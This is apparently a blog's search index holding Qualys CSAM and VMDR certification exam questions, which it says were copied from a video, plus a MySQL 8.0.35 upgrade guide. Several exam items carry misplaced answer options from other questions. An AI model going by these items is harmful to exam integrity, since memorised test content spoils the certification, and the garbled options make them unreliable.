[{"categories":["Qualys"],"content":"Which of the following template is currently available for Compliance reporting in CSAM? Choose an answer: PCI HIPPA CIS Benchmark FedRAMP ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:1","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"The Asset Details report template includes _________ attributes for reporting. Choose an answer: Both host and software information Software Information Host information Business app information, host information, and software information ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:2","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Operating Systems and hardware are categorized with _______ levels of categorization in CSAM. Choose an answer: 4 3 2 1 ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:3","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which attributes discovered by Passive Sensor are given a confidence level? Select two. Choose all that apply: Operating System Vulnerabilities Compliance Hardware ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:4","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Qualys categorizes your software inventory by which of the following license types? Select two. Choose all that apply: Open Source Trial Premier Commercial ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:5","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"What is one of the prerequisites to integrate Qualys with ServiceNow CMDB? Choose an answer: Qualys subscription with Global AssetView license Qualys subscription with VMDR license Qualys subscription with CSAM license Qualys subscription with Connectors license ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:6","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Asset Criticality Score is a user-defined score that is applied using _________ . Choose an answer: Asset Tags Asset Groups Software Authorization Rules Business Units ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:7","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which are the action types supported for Rule-based Alerts? Select three. Choose all that apply: Post to Slack Send to PagerDuty Send Email (Via Qualys) Send SMS ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:8","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which sensor gives you an inventory of all your assets deployed in a cloud environment like AWS using an API call? Choose an answer: Network Scanner Cloud Connector Cloud Agent OCA ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:9","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following is not included in the EASM data displayed in the Asset Details page? Choose an answer: DNS Open Ports Risk Score WHOIS ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:10","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following statements describes an ‘unidentified’ asset? Choose an answer: There is enough information about the asset, but the data isn’t yet catalogued in CSAMet There isn’t enough information gathered from the asset to correctly or accurately determine the OS/hardware of the asset The asset cannot be categorized correctly due to an issue in the CSAM database None of the Qualys sensors could scan the asset ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:11","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"External Attack Surface Management works by ________. Choose an answer: Discovering all domains, subdomains, subsidiaries Deploying Cloud Agents to your Internet-exposed assets Authenticated scanning using the Qualys External\\Internet Scanners Determining Internet-exposed assets from syncing with your CMDB ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:12","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which is the quickest option to identify how many assets have port 25 open? Choose an answer: Search Query Compliance Report Asset Details Report Interactive Report ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:13","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Select the items in this list that are TRUE about Asset Groups. Select two. Choose all that apply: Asset Groups can be configured dynamically using various rules Asset Groups should be IP ranges An IP address can exist in multiple Asset Groups Asset Groups can be nested ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:14","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"In CSAM, _______ is an expression that indicates that a hardware product is no longer serviced via upgrades, patches, or maintenance. Choose an answer: End-of-Life End-of-Sale End-of-Support Obsolete ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:15","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Three functions performed on your raw asset data by CyberSecurity Asset Management are _____________. Select three. Choose all that apply: Enrichment Categorization Normalization Compression ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:16","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"When combined with host vulnerability, compliance, and patch status, _________ helps to prioritize remediation along with patching for a host. Choose an answer: Asset categorization Asset enrichment Asset normalization Asset Criticality Score ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:17","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which sensor allows you to organize and categorize assets connected to the corporate network without actively scanning them? Choose an answer: Network Scanner Cloud Agent Passive Sensor CMDB Sync ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:18","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following features apply to Asset Tags? Select three. Choose all that apply: They can be automatically assigned to assets based on rules They can be nested to form a hierarchy They can be used as scanning and reporting targets They only support IP ranges ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:19","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following sensors works well for inventory and scanning of assets such as laptops used by remote users that aren’t always connected to the corporate network? Choose an answer: Cloud Agent Cloud connector Passive Sensor Network Scanner ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:20","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following are key features of the Global AssetView (free) application? Select three. Choose all that apply: Ability to define and track unauthorized software Discovery and inventory of all assets in the IT asset inventory Support for an Asset Criticality Score for asset prioritization Categorized and normalized hardware and software information ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:21","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"CSAM enhances your software inventory in the platform by telling you when the software is ______. Choose an answer: In the critical vulnerability severity range Taking too much memory Using too much CPU In the End-of-Life and End-of-Support Stage ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:22","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following represents the use cases of CSAM? Select three. Choose all that apply: View and report on all asset vulnerability and compliance posture in one place View and manage all IT asset inventory in one place Monitor and notify users on missing, unauthorized and EOL\\EOS software instances and obsolete hardware in the environment Provide an outside-in view of your IT asset inventory and security gaps through external attack surface management ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:23","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following statements are true regarding reports in CSAM? Select three. Choose all that apply: Reports in CSAM allow exporting asset details, software details, unauthorized\\missing software details and asset compliance data (FedRAMP) in CSV format Interactive reports in CSAM help you to dynamically identify security and configuration gaps on the most critical assets Rules configured under Rule Manager in the Responses section of CSAM allow you to schedule and share reports with necessary stakeholders Dashboards and widgets in CSAM can be used to view all IT asset inventory and monitor security gaps in the inventory in one place ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:24","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following is NOT an option for setting the asset context in an Interactive Report? Choose an answer: Asset Tags Software Categories Asset Categories Business Context ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:25","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"How is a host that doesn’t match any option from the list of managed devices classified? Choose an answer: Unmatched Unmanaged Unknown Unidentified ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:26","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which of the following are benefits of the External Attack Surface Management featureset in CSAM? Select two. Choose all that apply: Discovery of domains, subdomains, and subsidiaries Obtain an inside-out view of your IT infrastructure Continuous monitoring of your external attack surface Confirming vulnerabilties using external scanners ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:27","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Analyze the following statements and identify those that apply to software authorization rules in CSAM. Select three. Choose all that apply: Software authorization information can be imported from a CMDB Software is automatically categorized as authorized or unauthorized based on user defined rules Rule order decides priority while taking effect When there is a rule match for a software for an asset, no subsequent rules are applied on it ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:28","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"In CSAM, business information is imported in Qualys as a part of CMDB sync. This information will help you to _______. Select two. Choose all that apply: Prioritize assets for remediation based on their business criticality Identify asset owners and support personnel Identify EOL\\EOS software instances Identify unauthorized software installations ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:29","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["Qualys"],"content":"Which statements are true about the Asset Criticality Score configured within an asset tag in CSAM? Select three. Choose all that apply: Is supported by static as well as dynamic asset tags The Asset Criticality Score of an asset with multiple assets tags is based on the highest aggregated criticality score across all tags for that asset Can be customized to use different ranges such as 1 to 10 or 1 to 100, etc. Score 5 represents the most critical asset ","date":"2023-12-12","objectID":"/cybersecurity-asset-management-csam-exam-3.0/:0:30","tags":["Qualys"],"title":"CSAM认证答案","uri":"/cybersecurity-asset-management-csam-exam-3.0/"},{"categories":["数据库"],"content":"MYSQL8.x****版本更新 系统版本：windows11 步骤1 官网下载最新版8.0.35，下载链接MySQL :: Download MySQL Community Server 步骤2 查询当前mysql的版本，连接到数据库后执行查询语句select version(); 步骤3（重要步骤，建议在DBA允许的情况下慎重操作） 备份所有的数据库文件 mysqldump -u root -p –all-databases \u003e D:\\backup.sql 步骤4（重要步骤，建议在DBA允许的情况下慎重操作） 以管理员权限停止mysql服务，将下图中mysql-8.0.35-winx64文件里的所有文件拷贝到旧版本的对应目录下 需要拷贝的所有文件如下图所示 拷贝到旧版本mysql的对应目录下，旧版本下的my.ini配置文件不要更改 步骤5 以管理员权限重启mysql服务，查看版本是否更新成功 系统版本：SUSE Linux Enterprise 15 步骤1 官网下载最新版8.0.35，下载链接https://cdn.mysql.com//Downloads/MySQL-8.0/mysql-8.0.35-1.sl15.x86_64.rpm-bundle.tar ，下载后解压 步骤2 查询当前mysql的版本，连接到数据库后执行查询语句select version(); 步骤3（重要步骤，建议在DBA允许的情况下慎重操作） 备份所有的数据库文件命令sudo mysqldump -u root -p –all-databases \u003e /root/databases.sql 步骤4（重要步骤，建议在DBA允许的情况下慎重操作） 停止mysql进程 systemctl stop mysql 卸载原先的mysql程序 查看已安装的mysql应用rpm -qa | grep mysql 卸载mysql命令 rpm -ev mysql-community-libs-8.0.28-1.sl15.x86_64 mysql-community-common-8.0.28-1.sl15.x86_64 mysql-community-icu-data-files-8.0.28-1.sl15.x86_64 mysql-community-client-plugins-8.0.28-1.sl15.x86_64 mysql-community-server-8.0.28-1.sl15.x86_64 mysql-community-client-8.0.28-1.sl15.x86_64 删除所有程序，删除后使用rpm -qa | grep mysql查看有无残留 步骤5（重要步骤，建议在DBA允许的情况下慎重操作） 重新安装mysql 8.0.35，按照以下命令的顺序进行安装 rpm -ivh mysql-community-common-8.0.35-1.sl15.x86_64.rpm rpm -ivh mysql-community-icu-data-files-8.0.35-1.sl15.x86_64.rpm rpm -ivh mysql-community-client-plugins-8.0.35-1.sl15.x86_64.rpm rpm -ivh mysql-community-libs-8.0.35-1.sl15.x86_64.rpm rpm -ivh mysql-community-client-8.0.35-1.sl15.x86_64.rpm rpm -ivh mysql-community-server-8.0.35-1.sl15.x86_64.rpm 步骤6 重启mysql Systemctl start mysql 连接到mysql，mysql账户密码和之前旧版本中的相同。 ","date":"2023-12-12","objectID":"/mysql%E6%9B%B4%E6%96%B0/:0:0","tags":["数据库"],"title":"mysql更新","uri":"/mysql%E6%9B%B4%E6%96%B0/"},{"categories":["Qualys"],"content":"Your objective is to display information about critical assets for the past year. Why are dashboard widgets NOT an appropriate choice?Choose an answer: They only display data for the past 90 days. Widgets can store real-time data but cannot store trend data. They only display data for the past 7 days. They only display data for the past 30 days. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:1:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which resource allows you to see the maintenance windows，upgrades，and outages of each platform？ https://platform.qualys.com https://support.qualys.com https://status.qualys.com ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:2:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You have been asked to quickly produce a report which includes a high-level view of your scan results. What is the best way to achieve this? Choose an answer: Run a Scorecard report. Run a new vulnerability scan. Run a Remediation report. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:3:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"“Impact if vulnerability is exploited” What is being described in this statement? Choose an answer: Threat Level Risk Level Severity Level Potential vulnerabilities are found by a Passive Sensor and not by a scanner appliance. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:4:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What is the first stage of the VMDR lifecycle? Choose an answer: Vulnerability Management Asset Management Response TruRisk Level ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:5:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"A critical level Qualys Detection Score (QDS) includes which attributes? (Select two.) Choose all that apply: Evidence of exploitation by threat actors An Asset Tag with an ACS level of 5. Weaponized exploit available VMDR 2.0 Prioritzation Report ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:6:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why might you choose Host-based findings for your report instead of Scan-based findings? Choose an answer: To enable users with different roles to view vulnerability history. To enable you to view vulnerability history from an individual scan. To enable you to view vulnerability history of a selection of vulnerabilities. To enable you to view the vulnerability history of any host asset. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:7:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why does Qualys recommend performing scans in authenticated mode? Choose an answer: Because it provides the most accurate results with fewer false positives. Because it is more likely to discover high-severity vulnerabilities. Because it includes all QIDs in every scan Because it includes “risk” in addition to “severity”. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:8:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why might you use Qualys TruRisk? Choose an answer: It helps you remediate and fix the vulnerabilities that really count to your organization. It enables you to manage remediation with ServiceNow integration. It enables you to identify unauthorized and end-of-life software. It prioritizes detected vulnerabilities based on CVSS score and detection age. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:9:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which of the following components contribute to a Qualys TruRisk score? (Select two.) Choose all that apply: Qualys Detection Score Asset Criticality Score Agentless Tracking ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:10:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which of the following are usually used as the starting point of an Asset Tag hierarchy? Choose an answer: Asset Criticality Score Dynamic Tags Static Tags TruRisk Score Severity Level ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:11:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which Qualys sensor runs as a local process on the host they protect? Choose an answer: Offline Scanner Cloud Agent Passive Sensor ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:12:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"How can a search list be used? (Select three.) Choose all that apply: Remediation Tickets Report Templates Asset Criticality Score Option Profiles Virtual Scanner Appliance ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:13:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You need to scan private IP address ranges in a local area network. Which Qualys sensors should you consider? (Select two.) Choose all that apply: Passive Sensor Physical appliance Out of band Sensor Virtual appliance ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:14:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You have been asked to organize the assets in your Qualys subscription, including their criticality. Which feature should you use? Choose an answer: Severity Level Asset Criticality Score Asset Groups ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:15:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Your organization has recently decommissioned a number of assets. You are concerned that your reports might become inaccurate. What action should you choose to correct this issue? Choose an answer: Delete the decommissioned assets from your subscription. Purge the decommissioned assets from your subscription. They only display data for the past 7 days. Disable Cloud Agent application modules. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:16:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why might you create a Search List that includes Real Time Indicators? Choose an answer: To help prioritize active security threats. To help prioritize high severity level vulnerabilities. To help prioritize critical assets. To help prioritize internet-facing assets. Asset Tags ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:17:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You have been asked to create a scan job which will detect load balancers. How would you configure this? Choose an answer: By including this option in a Cloud Agent Configuration Profile. By enabling this option as part of the Prioritization Report wizard and in an Option Profile. By including this option in an Option Profile and adding this Option Profile to the scan job. By including this option in an Authentication Record. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:18:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"How can you establish a context when creating a Prioritization Report? Choose an answer: Asset Groups Business Units User Roles Asset Tags ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:19:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What is one of the differences between Global Asset View (GAV) and CyberSecurity Asset Management (CSAM)? Choose an answer: GAV does not allow you to add business-context through dynamic tagging. CSAM enables you to build rules to identify unauthorized software and quickly identify non-compliant assets. GAV enables you to enable 2-way integration to sync with ServiceNow CMDB CSAM does not enable you to define asset criticality using asset tags. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:20:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You want to use QQL to help you decide which patches to install on Windows assets. Which QQL search token would help you to filter the list of patches in the Patch Selector? Choose an answer: software:(category1: Security) isSuperseded: false criticalityScore\u003c1000 vulnerabilities.detectionAge: default ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:21:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why should you run a supplemental scan on Cloud Agent hosts, including remote only vulnerabilities? Choose an answer: “Remote Only” QIDs are only detected by using a relevant Authentication Record. “Remote Only” QIDs can only be detected by Cloud Agents on Unix platforms. An External scanner is always required to detect “Remote Only” QIDs. A scanner’s remote perspective is required to detect “Remote Only” QIDs ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:22:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why might you choose to use a Qualys Gateway Server (QGS) as part of your patch deployment process? Choose an answer: The QGS is required for assets without the patch management license. The QGS is beneficial for agents which have not checked in within the last 30 days. The QGS is required to enable access to the vendor Content Delivery Networks. The QGS is used to enable local caching of downloaded patches for all agents. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:23:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which of the following statements best describes severity level 3 and 4 vulnerabilities? Choose an answer: Severity level 3 and 4 vulnerabilities could potentially allow an attacker to gain root or admin privileges to the vulnerable host. Severity level 3 and 4 vulnerabilities involve the disclosure of sensitive data that could potentially be very useful to an attacker. Severity level 3 and 4 vulnerabilities involve the disclosure of open port information. Severity levels 3 and 4 vunerabilities involve some type of potential compromise of the host system or one of its applications or services. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:24:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Why would you choose to select “Enable Agent Scan Merge” in the agent Configuration Profile? Choose an answer: This is to enable the Agent to be included in a TruRisk-based Prioritization Report. This is required to change the Data Collection Interval setting. This is to allow scanner appliances to read the Agent Correlation Identifier. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:25:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What is the difference between a Confirmed vulnerability and a Potential vulnerability? Choose an answer: Potential vulnerabilities are found by a Passive Sensor and not by a scanner appliance. Confirmed vulnerabilities have more than one active tests, but Potential vulnerabilities have one test. Confirmed vulnerabilities have no patch available and Potential vulnerabilities have a patch available. Confirmed vulnerabilities are found only on internet-facing assets. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:26:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"Which of the following is a best practice for using Asset Tags? Choose an answer: Use multiple types of rule engines in a single hierarchy Never mix static tags and dynamic tags in the same hierarchy Never attempt to next asset tags in a parent-child hierarchy. Attempt to group tag hierarchies around some type of common criteria. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:27:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"You work for a large organization and you need to delegate the task of adding assets. Which user roles could you assign to your co-workers? (Select two.) Choose all that apply: Reader Unit Manager Agentless Tracking Manager ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:28:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What are two advantages of using a ““Numerical”” widget? (Select two.) Choose all that apply: It can track status changes for up to 12 months It can be designed to change color, when specific threshold conditions are met. It displays the Data Collection Interval setting. It can include trend data. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:29:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What is a consideration of using Asset Groups to organize assets in your subscription? Choose an answer: The Asset Tag which gets created based on this Asset Group will have an Asset Criticality Score of 4. Host assignment is determined by Asset Tag Rule Engine Groups are typically nested, creating various parent/child relationships ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:30:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"How does Qualys TruRisk help you manage vulnerabilities? Choose an answer: It removes disabled vulnerabilities from a Prioritization Report. It prioritizes detected vulnerabilities based on CVSS score and detection age. It calculates risk based on the asset’s environment. It places detected vulnerabilities within the context of your critical and non-critical assets. ","date":"2023-12-12","objectID":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/:31:0","tags":["Qualys"],"title":"VMDR认证答案","uri":"/vmdr%E8%AE%A4%E8%AF%81%E7%AD%94%E6%A1%88/"},{"categories":["Qualys"],"content":"What is included in a Zero-touch Patch Job? (Select two.) Choose all that apply: A recurring job schedule A Remediation Ticket A Qualys TruRisk score Patches that are selected using QQL 本文是将youtube大佬答案摘抄至此，照着视频抄不爽。原视频链接 https://youtu.be/34F-J2Mfr5Y?si=X67auJKmbecdR1Cr 